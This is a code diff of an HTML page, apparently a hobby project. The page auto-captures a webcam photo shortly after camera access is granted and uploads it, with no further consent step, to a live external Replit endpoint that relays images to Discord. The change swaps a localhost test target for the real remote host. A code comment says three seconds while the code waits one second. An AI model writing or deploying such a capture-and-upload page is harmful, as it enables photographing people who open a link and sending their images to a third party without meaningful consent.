@@ -1,50 +1,67 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Auto Webcam Capture</title>
+  <title>Camera Auto-Capture</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      text-align: center;
+      margin-top: 50px;
+    }
+    video {
+      width: 90%;
+      max-width: 400px;
+      border-radius: 12px;
+      box-shadow: 0 0 12px #aaa;
+    }
+  </style>
 </head>
 <body>
-  <h1>Auto Capture (Test Only)</h1>
-  <video id="video" autoplay playsinline style="display:none;"></video>
+  <h2>📷 Capturing image in 3 seconds...</h2>
+  <video id="video" autoplay playsinline></video>
   <canvas id="canvas" style="display:none;"></canvas>
+
   <script>
     const video = document.getElementById('video');
     const canvas = document.getElementById('canvas');
-    const ctx = canvas.getContext('2d');
+    const context = canvas.getContext('2d');
 
-    async function init() {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-        video.srcObject = stream;
+    navigator.mediaDevices.getUserMedia({ video: true }).then((stream) => {
+      video.srcObject = stream;
 
-        // Wait for camera to be ready
-        video.onloadedmetadata = () => {
-          setTimeout(() => {
-            captureAndSend();
-          }, 3000); // 3 seconds after camera loads
-        };
-      } catch (err) {
-        console.error("Camera access denied:", err);
-      }
-    }
+      video.onloadedmetadata = () => {
+        setTimeout(() => {
+          takePhoto();
+        }, 1000); // wait 3 seconds before auto-capture
+      };
+    }).catch((err) => {
+      alert("Camera access denied");
+      console.error(err);
+    });
 
-    function captureAndSend() {
+    function takePhoto() {
       canvas.width = video.videoWidth;
       canvas.height = video.videoHeight;
-      ctx.drawImage(video, 0, 0);
+      context.drawImage(video, 0, 0);
+      const imageData = canvas.toDataURL('image/png');
 
-      const imageData = canvas.toDataURL("image/jpeg");
-      console.log("Captured Image:", imageData);
-
-      // POST to your Discord bot backend
-      fetch("http://localhost:3000/upload", {
+      fetch("https://39eb31e9-7973-41c9-9d96-97c9cf1368e7-00-1441qj89f8mev.pike.replit.dev/upload", {
         method: "POST",
         body: JSON.stringify({ image: imageData }),
-        headers: { "Content-Type": "application/json" }
+        headers: {
+          "Content-Type": "application/json"
+        }
+      })
+      .then(res => res.text())
+      .then(msg => {
+        alert("✅ Image sent to Discord!");
+        console.log(msg);
+      })
+      .catch(err => {
+        alert("❌ Failed to send image");
+        console.error(err);
       });
     }
-
-    init();
   </script>
 </body>
 </html>
